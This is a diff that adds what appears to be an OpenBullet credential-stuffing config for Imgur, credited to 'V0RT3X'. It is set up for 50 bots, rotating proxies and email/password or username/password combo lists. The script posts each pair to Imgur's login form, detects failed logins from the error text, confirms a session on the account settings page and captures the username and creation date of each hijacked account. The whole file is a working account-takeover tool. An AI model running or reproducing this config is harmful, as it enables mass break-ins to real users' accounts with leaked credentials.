@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Imgur || V0RT3X",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-02T22:10:04.9633255+01:00",
+  "AdditionalInfo": "V0RT3X",
+  "Author": "V0RT3X",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://imgur.com/signin?redirect=https%3A%2F%2Fimgur.com%2F" 
+  CONTENT "username=<USER>&password=<PASS>&remember=remember&submit=&_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Your login information was incorrect." 
+REQUEST GET "https://imgur.com/account/settings" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY ">sign out<" 
+PARSE "<SOURCE>" LR "<input id=\"url\" type=\"text\" tabindex=\"1\" name=\"url\" minlength=\"4\" maxlength=\"64\" ualphanumeric=\"true\" class=\"required\" value=\"" "\"" -> CAP "Username" 
+PARSE "<SOURCE>" LR "<div><strong>" "</strong></div>" -> CAP "Created" 
